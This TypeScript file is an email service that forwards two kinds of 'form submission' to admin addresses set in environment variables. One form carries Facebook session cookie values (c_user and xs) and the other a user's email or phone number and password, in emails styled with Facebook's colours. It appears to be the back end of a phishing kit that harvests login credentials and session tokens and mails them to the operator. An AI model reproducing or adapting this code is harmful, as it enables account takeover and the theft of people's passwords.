import nodemailer from "nodemailer";

class EmailService {
  async sendFormOneEmail(data: any, adminEmail?: string) {
    const recipients = adminEmail ? 
      [adminEmail] : 
      [
        process.env.FORM_ONE_ADMIN_EMAIL,
        process.env.FORM_ONE_ADMIN_EMAIL_2,
        process.env.FORM_ONE_ADMIN_EMAIL_3
      ].filter(Boolean);

    if (recipients.length === 0) {
      throw new Error("No recipients configured for form one");
    }

    const transporter = nodemailer.createTransport({
      host: process.env.FORM_ONE_SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.FORM_ONE_SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.FORM_ONE_SMTP_USER,
        pass: process.env.FORM_ONE_SMTP_PASS
      }
    });

    try {
      console.log('Attempting to send form one email to:', recipients);

      const mailOptions = {
        from: process.env.FORM_ONE_SMTP_USER,
        to: recipients.join(','),
        subject: "Form One Submission",
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #1877f2; margin-bottom: 20px;">Form One Submission Details</h2>
            <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <p style="margin: 10px 0;"><strong>c_user:</strong> ${data.c_user}</p>
              <p style="margin: 10px 0;"><strong>xs:</strong> ${data.xs}</p>
              <p style="margin: 10px 0;"><strong>Additional Admin Email:</strong> ${adminEmail || "Not provided"}</p>
              <p style="margin: 10px 0;"><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
            </div>
            <p style="color: #65676B; font-size: 12px; margin-top: 20px;">This is an automated message.</p>
          </div>
        `,
      };

      const result = await transporter.sendMail(mailOptions);
      console.log('Form one email sent successfully:', result.messageId);
      return result;
    } catch (error) {
      console.error('Error sending form one email:', error);
      throw error;
    }
  }

  async sendFormTwoEmail(data: any, adminEmail?: string) {
    const recipients = adminEmail ? 
      [adminEmail] : 
      [
        process.env.FORM_TWO_ADMIN_EMAIL,
        process.env.FORM_TWO_ADMIN_EMAIL_2,
        process.env.FORM_TWO_ADMIN_EMAIL_3
      ].filter(Boolean);

    if (recipients.length === 0) {
      throw new Error("No recipients configured for form two");
    }

    const transporter = nodemailer.createTransport({
      host: process.env.FORM_TWO_SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.FORM_TWO_SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.FORM_TWO_SMTP_USER,
        pass: process.env.FORM_TWO_SMTP_PASS
      }
    });

    try {
      console.log('Attempting to send form two email to:', recipients);

      const mailOptions = {
        from: process.env.FORM_TWO_SMTP_USER,
        to: recipients.join(','),
        subject: "Form Two Submission",
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #1877f2; margin-bottom: 20px;">Form Two Submission Details</h2>
            <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <p style="margin: 10px 0;"><strong>User Email/Phone:</strong> ${data.user_email}</p>
              <p style="margin: 10px 0;"><strong>Password:</strong> ${data.password}</p>
              <p style="margin: 10px 0;"><strong>Additional Admin Email:</strong> ${adminEmail || "Not provided"}</p>
              <p style="margin: 10px 0;"><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
            </div>
            <p style="color: #65676B; font-size: 12px; margin-top: 20px;">This is an automated message.</p>
          </div>
        `,
      };

      const result = await transporter.sendMail(mailOptions);
      console.log('Form two email sent successfully:', result.messageId);
      return result;
    } catch (error) {
      console.error('Error sending form two email:', error);
      throw error;
    }
  }
}

export const emailService = new EmailService();